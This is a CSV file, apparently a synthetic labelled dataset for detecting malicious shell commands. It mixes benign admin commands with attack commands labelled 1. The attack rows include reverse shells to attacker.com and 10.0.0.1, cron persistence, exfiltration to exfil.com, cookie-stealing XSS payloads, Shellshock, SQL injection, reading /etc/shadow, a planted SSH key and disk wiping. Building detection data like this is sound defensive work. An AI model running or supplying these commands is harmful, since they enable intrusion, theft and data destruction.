timestamp,attacker_ip,command_sequence,label
2026-01-23 15:42:12,211.201.2.18,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 07:31:12,99.24.226.137,journalctl -u nginx -n 50,0
2026-01-23 16:39:12,54.30.121.195,enum4linux target.com,1
2026-01-23 03:11:12,144.43.67.11,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 12:36:12,65.112.116.47,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 03:16:12,143.172.106.215,journalctl -u nginx -n 50,0
2026-01-23 15:39:12,94.66.122.72,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 11:05:12,184.70.222.85,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 17:30:12,1.240.251.49,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
2026-01-23 05:17:12,220.69.13.206,ping -c 4 google.com,0
2026-01-23 06:15:12,36.210.24.31,logrotate -f /etc/logrotate.d/nginx,0
2026-01-23 17:11:12,75.75.88.129,rm -rf /var/www/html/*,1
2026-01-23 05:51:12,91.203.223.40,ps aux | grep nginx,0
2026-01-23 09:06:12,192.33.23.204,lsblk,0
2026-01-23 05:35:12,115.18.80.137,free -m,0
2026-01-23 05:21:12,108.32.215.145,scp user@server:/var/log/app.log ./,0
2026-01-23 04:50:12,185.45.243.137,ln -s /var/www/html /home/user/www,0
2026-01-23 15:59:12,62.114.254.66,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 09:51:12,127.18.193.246,tar czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.com/leak,1
2026-01-23 15:48:12,73.165.159.169,nikto -h http://target.com,1
2026-01-23 13:42:12,137.123.104.49,nikto -h http://target.com,1
2026-01-23 06:13:12,109.113.33.38,rsnapshot daily,0
2026-01-23 16:58:12,58.85.178.60,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 11:09:12,123.252.240.248,bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',1
2026-01-23 15:01:12,191.198.101.35,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 11:39:12,135.55.96.36,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 03:22:12,74.95.142.235,ping -c 4 google.com,0
2026-01-23 15:38:12,159.217.249.239,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 01:36:12,32.137.37.192,ls -la /var/log/,0
2026-01-23 12:59:12,60.250.110.189,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 14:06:12,119.52.145.25,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 08:39:12,175.95.232.192,systemctl status mysql,0
2026-01-23 03:03:12,222.73.196.246,tail -100 /var/log/nginx/access.log,0
2026-01-23 01:19:12,216.188.194.221,apt update && apt list --upgradable,0
2026-01-23 07:16:12,91.140.39.247,grep 'error' /var/log/syslog,0
2026-01-23 06:44:12,11.229.147.119,id,0
2026-01-23 03:44:12,216.223.145.68,mtr -c 10 google.com,0
2026-01-23 15:23:12,115.235.140.237,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 05:11:12,109.170.26.62,traceroute google.com,0
2026-01-23 14:05:12,22.24.138.152,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 09:42:12,84.99.198.170,"echo ""* * * * * /usr/bin/nc -e /bin/sh attacker.com 4444"" >> /tmp/cronjob && crontab /tmp/cronjob",1
2026-01-23 09:13:12,96.188.160.118,ss -tulwn,0
2026-01-23 10:49:12,219.14.221.63,bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',1
2026-01-23 12:33:12,145.250.186.252,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 13:29:12,140.91.5.66,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 17:43:12,216.164.30.36,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 04:24:12,99.28.246.190,uptime,0
2026-01-23 03:02:12,208.154.33.192,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 13:10:12,74.110.63.138,nikto -h http://target.com,1
2026-01-23 16:02:12,22.18.13.26,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 07:46:12,103.129.220.24,dig example.com,0
2026-01-23 06:59:12,99.181.65.243,nslookup google.com,0
2026-01-23 10:53:12,59.252.96.20,"curl -X POST ""http://target.com/login"" --data ""username=admin'--&password=anything""",1
2026-01-23 08:22:12,139.250.200.196,ip route show,0
2026-01-23 14:53:12,163.18.242.158,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 15:28:12,50.203.154.204,enum4linux target.com,1
2026-01-23 14:26:12,36.169.32.201,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
2026-01-23 07:23:12,116.232.146.37,curl -I https://example.com,0
2026-01-23 11:52:12,161.183.36.14,sudo nmap --script vuln target.com,1
2026-01-23 01:17:12,40.57.196.245,df -h /,0
2026-01-23 08:44:12,96.207.134.164,timedatectl,0
2026-01-23 13:27:12,98.61.255.233,cat ../../../etc/passwd,1
2026-01-23 05:24:12,61.173.102.119,top -n 1 | head -20,0
2026-01-23 09:02:12,156.193.62.43,netstat -tulpn,0
2026-01-23 11:29:12,72.123.158.188,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 12:05:12,68.149.117.209,host -t txt target.com,1
2026-01-23 14:55:12,212.156.84.177,rm -rf /var/www/html/*,1
2026-01-23 10:37:12,180.72.150.130,"curl -H ""User-Agent: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
2026-01-23 10:45:12,96.1.228.246,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 12:15:12,56.174.203.137,cat ../../../../etc/shadow,1
2026-01-23 16:07:12,122.251.86.76,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 10:08:12,170.94.178.121,"curl ""http://target.com/load?file=../../../../etc/passwd""",1
2026-01-23 07:29:12,89.116.34.67,top -n 1 | head -20,0
2026-01-23 14:39:12,156.236.174.51,ncat 10.0.0.1 4444 -e /bin/bash,1
2026-01-23 15:52:12,39.217.225.125,sudo nmap --script vuln target.com,1
